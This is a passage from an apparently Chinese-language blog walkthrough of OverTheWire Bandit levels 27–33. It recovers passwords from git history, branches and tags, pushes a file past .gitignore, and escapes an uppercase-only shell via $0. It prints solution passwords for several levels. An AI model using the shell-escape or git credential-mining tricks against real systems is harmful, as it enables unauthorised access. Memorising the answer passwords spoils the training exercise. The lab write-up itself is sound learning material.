+&lt;p&gt;There is a git repository at &lt;code&gt;ssh://bandit27-git@localhost/home/bandit27-git/repo&lt;/code&gt; via the port &lt;code&gt;2220&lt;/code&gt;. The password for the user &lt;code&gt;bandit27-git&lt;/code&gt; is the same as for the user &lt;code&gt;bandit27&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Clone the repository and find the password for the next level.&lt;/p&gt;
+&lt;p&gt;在/tmp创建一个目录，接着在目录下git init，再git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo，注意端口号。最后读取README文件即成功&lt;/p&gt;
+&lt;p&gt;password：AVanL161y9rsbcJIsFHuw35rjaOM19nR&lt;/p&gt;
+&lt;h3 id=&#34;level28-29&#34;&gt;level28-29
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;There is a git repository at &lt;code&gt;ssh://bandit28-git@localhost/home/bandit28-git/repo&lt;/code&gt; via the port &lt;code&gt;2220&lt;/code&gt;. The password for the user &lt;code&gt;bandit28-git&lt;/code&gt; is the same as for the user &lt;code&gt;bandit28&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Clone the repository and find the password for the next level.&lt;/p&gt;
+&lt;p&gt;tips：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;git log，show us the commit log&lt;/li&gt;
+&lt;li&gt;git show &lt;commit&gt; show us the content of a commit (when creating a public repository it is important to be aware of  the information you push to it since changes and previous version are saved. So sensitive data, like passwords, could still be retrieved).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;克隆远程仓库后发现readme.md文件里没有显示password，无从下手，参考别人的博客发现这两个命令，于是迎刃而解。还是得积累更多的知识。&lt;/p&gt;
+&lt;h3 id=&#34;level29-30&#34;&gt;level29-30
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;
+There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.&lt;/p&gt;
+&lt;p&gt;Clone the repository and find the password for the next level.&lt;/p&gt;
+&lt;p&gt;参照上个level的流程，发现&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit29@bandit:/tmp/bandit29/repo$ cat README.md 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Bandit Notes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Some notes &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; bandit30 of bandit.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- username: bandit30
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- password: &amp;lt;no passwords in production!&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;production提示我们有其它的环境&lt;/p&gt;
+&lt;p&gt;于是利用git branch -a查看是否有其它分支，发现dev环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit29@bandit:/tmp/bandit29/repo$ git branch -a
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* master
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  remotes/origin/HEAD -&amp;gt; origin/master
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  remotes/origin/dev
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  remotes/origin/master
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  remotes/origin/sploits-dev
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用git checkout dev或git switch dev切换分支&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit29@bandit:/tmp/bandit29/repo$ git checkout remotes/origin/dev
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Note: switching to &lt;span class=&#34;s1&#34;&gt;&amp;#39;remotes/origin/dev&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;最后查看仓库，找到密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit29@bandit:/tmp/bandit29/repo$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;code  README.md
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit29@bandit:/tmp/bandit29/repo$ cat README.md 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Bandit Notes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Some notes &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; bandit30 of bandit.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- username: bandit30
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level30-31&#34;&gt;level30-31
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;There is a git repository at &lt;code&gt;ssh://bandit30-git@localhost/home/bandit30-git/repo&lt;/code&gt; via the port &lt;code&gt;2220&lt;/code&gt;. The password for the user &lt;code&gt;bandit30-git&lt;/code&gt; is the same as for the user &lt;code&gt;bandit30&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Clone the repository and find the password for the next level.&lt;/p&gt;
+&lt;p&gt;与上面几个level的差异是这个level使用git tag来解决&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Git tagging&lt;/strong&gt; is a way to mark specific points in the history of the repository. One example would be to mark release points of the software. The command to see the tags is &lt;code&gt;git tag&lt;/code&gt;. To create a tag the command is &lt;code&gt;git tag -a &amp;lt;tag_name&amp;gt; -m &amp;lt;&amp;quot;tag description/message&amp;quot;&amp;gt;&lt;/code&gt;. To see more details, like the tag message and commit, you can use the following command: &lt;code&gt;git show &amp;lt;tag_name&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git tag
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;secret
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git show secret
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level31-32&#34;&gt;level31-32
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;There is a git repository at &lt;code&gt;ssh://bandit31-git@localhost/home/bandit31-git/repo&lt;/code&gt; via the port &lt;code&gt;2220&lt;/code&gt;. The password for the user &lt;code&gt;bandit31-git&lt;/code&gt; is the same as for the user &lt;code&gt;bandit31&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Clone the repository and find the password for the next level.&lt;/p&gt;
+&lt;p&gt;Tips&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Git Commit&lt;/strong&gt; saves the currently made changes with a message describing these changes. The flag &lt;code&gt;-a&lt;/code&gt; makes sure all modified/deleted files are staged.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Git Push&lt;/strong&gt; updates local changes in remote repositories. When pushing for the first time, you should also define the branch with &lt;code&gt;-u&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Git Ignore&lt;/strong&gt; is a file with the filename ‘.gitignore’. In this file, all file names/extensions that should be ignored by the commit are written. This means if a file which is in the ignore file is created/changed, it will not be part of the commit/repository. Git ignore also allows for wildcards. (&lt;em&gt;For example, :&lt;/em&gt; ‘*.pyc’ means all files with the ending ‘.pyc’ will be ignored.) There are pre-written files for specific situations and languages, like &lt;a class=&#34;link&#34; href=&#34;https://github.com/github/gitignore/blob/main/Python.gitignore&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;this one&lt;/a&gt; for Python.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Git Add&lt;/strong&gt; updates what files will be part of the next commit. The &lt;code&gt;-f&lt;/code&gt; flag forces files to be able to be committed, even when they are normally ignored.&lt;/p&gt;
+&lt;p&gt;.gitignore用来过滤本地仓库的一些文件或目录，使得在上传至远程仓库时忽略这些文件和目录，具体用法STFW&lt;/p&gt;
+&lt;p&gt;解法：克隆远程仓库后查看readme.md文件，发现如下提示，按照提示创建key.txt文件，并把&amp;rsquo;May I come in?&amp;lsquo;写入，接着push到远程仓库，发现报错，于是修改.gitignore的文件内容使得其能正常push到远程仓库。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit31@bandit:/tmp/bandit31/repo$ cat README.md 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; your task is to push a file to the remote repository.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Details:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    File name: key.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Content: &lt;span class=&#34;s1&#34;&gt;&amp;#39;May I come in?&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Branch: master
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit31@bandit:/tmp/bandit31/repo$ git add .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit31@bandit:/tmp/bandit31/repo$ git commit -a -m&lt;span class=&#34;s2&#34;&gt;&amp;#34;first&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master 50ed76a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; first
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; files changed, &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; insertions&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; deletion&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; create mode &lt;span class=&#34;m&#34;&gt;100644&lt;/span&gt; key.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enumerating objects: 6, &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Counting objects: 100% &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6/6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Delta compression using up to &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; threads
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Compressing objects: 100% &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2/2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Writing objects: 100% &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4/4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; bytes &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 331.00 KiB/s, &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Total &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;delta 0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, reused &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;delta 0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, pack-reused &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: &lt;span class=&#34;c1&#34;&gt;### Attempting to validate files... ####&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: Well &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;! Here is the password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the next level:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;remote: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;To ssh://localhost:2220/home/bandit31-git/repo
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level32-33&#34;&gt;level32-33
+&lt;/h3&gt;&lt;p&gt;After all this &lt;code&gt;git&lt;/code&gt; stuff its time for another escape. Good luck!&lt;/p&gt;
+&lt;p&gt;Tips&lt;/p&gt;
+&lt;p&gt;Linux has &lt;strong&gt;Variables&lt;/strong&gt; called local variables (valid in current shell), shell variables (set up by shell) and environment variables (valid systemwide). These variables have their names in uppercase only. They are defined by writing &lt;code&gt;VAR_NAME=var_value&lt;/code&gt; in the command line. To see the content of a variable, you can write &lt;code&gt;echo $VAR_NAME&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;To print all environment variables, you can use &lt;code&gt;printenv&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Some common that are good to know are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;TERM&lt;/code&gt; -  current terminal emulation&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HOME&lt;/code&gt; - the path to home directory of currently logged in user&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LANG&lt;/code&gt; - current locales settings&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PATH&lt;/code&gt; - directory list to be searched when executing commands&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PWD&lt;/code&gt; - pathname of the current working directory&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SHELL&lt;/code&gt;/&lt;code&gt;0&lt;/code&gt; - the path of the current user’s shell&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;USER&lt;/code&gt; - currently logged-in user&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;解法：因为shell把我们输入的字符全部转换为大写了，所以无法执行正常的指令，大写的字符一般与环境变量有关，$0表示所使用shell的名字，$$表示进程id，通过使用$0来进入正常shell，接着进入bandit33查看密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ whoami    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit33
